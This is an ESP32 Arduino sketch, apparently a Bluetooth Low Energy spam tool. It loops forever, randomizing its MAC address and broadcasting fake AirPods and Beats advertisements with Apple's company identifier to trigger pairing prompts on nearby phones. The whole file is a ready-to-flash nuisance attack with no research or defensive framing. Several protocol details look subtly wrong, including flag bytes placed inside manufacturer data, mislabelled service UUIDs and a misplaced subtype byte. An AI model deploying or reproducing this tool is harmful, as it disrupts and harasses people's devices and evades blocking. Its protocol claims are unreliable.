#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include "esp_bt_device.h"
#include <Arduino.h>

// Ensure a valid unicast MAC (first byte even)
void setRandomMAC() {
    uint8_t newMAC[6];
    newMAC[0] = random(0x00, 0xFE) & 0xFE; // Ensure unicast (LSB=0)
    for (int i = 1; i < 6; i++) {
        newMAC[i] = random(0x00, 0xFF);
    }
    esp_base_mac_addr_set(newMAC);
    Serial.printf("[INFO] New MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                  newMAC[0], newMAC[1], newMAC[2],
                  newMAC[3], newMAC[4], newMAC[5]);
}

// Random AirPods/Beats name
String getRandomAppleName() {
    const char *appleNames[] = {
        "AirPods Pro", "Beats Studio", "AirPods Max",
        "AirPods 3", "Beats Fit Pro", "Beats Solo3"
    };
    return String(appleNames[random(0, 6)]);
}

// Generate Apple advertisement data (AirPods/Beats payload)
BLEAdvertisementData getAppleAdvData(const String &deviceName, bool isAirPods) {
    BLEAdvertisementData advData;

    // Set random Apple-like device name
    advData.setName(deviceName.c_str());

    // Apple company identifier (0x004C)
    uint8_t appleManufacturerData[] = {
        0x02, 0x01, 0x06,       // BLE flags
        0x0B, 0xFF,             // Manufacturer-specific length
        0x4C, 0x00,             // Apple Company ID (0x004C)
        0x10,                   // AirPods/Beats subtype
        0x02, 0x03, 0x00, 0x00, // Features (random data)
        0x00, 0x00, 0x00, 0x00  // Placeholder
    };

    // Adjust subtype: AirPods (0x01) or Beats (0x02)
    appleManufacturerData[8] = isAirPods ? 0x01 : 0x02;

    advData.addData(std::string((char *)appleManufacturerData, sizeof(appleManufacturerData)));

    // Apple-specific service UUID for AirPods (0xFD6F) or Beats (0xFD8D)
    const uint8_t serviceData[] = {
        isAirPods ? 0x6F : 0x8D, 0xFD, // Little-endian (0xFD6F / 0xFD8D)
        0x00, 0x00, 0x00, 0x00,       // Random payload
        0x00, 0x00, 0x00, 0x00
    };
    advData.setServiceData(BLEUUID((uint16_t)(isAirPods ? 0xFD6F : 0xFD8D)),
                           std::string((char *)serviceData, sizeof(serviceData)));

    return advData;
}

// BLE Spammer Task
void bleSpamTask(void *pvParameters) {
    BLEServer *pServer = BLEDevice::createServer();
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();

    while (true) {
        setRandomMAC(); // Randomize MAC address

        // 50% chance of AirPods or Beats
        bool isAirPods = random(0, 2);
        String deviceName = getRandomAppleName();
        BLEAdvertisementData advData = getAppleAdvData(deviceName, isAirPods);

        // Start BLE advertising
        pAdvertising->setAdvertisementData(advData);
        pAdvertising->start();

        Serial.printf("[INFO] Spamming: %s (Type: %s)\n",
                      deviceName.c_str(), isAirPods ? "AirPods" : "Beats");

        delay(3000); // Spam for 3 seconds

        pAdvertising->stop();
        delay(500); // Short cooldown between cycles
    }
}

void setup() {
    Serial.begin(115200);
    BLEDevice::init("ESP32-Spammer");

    // Start BLE spam task on Core 0 (for better speed)
    xTaskCreatePinnedToCore(bleSpamTask, "bleSpamTask", 8192, NULL, 1, NULL, 0);
}

void loop() {
    delay(1000); // Main loop idle
}
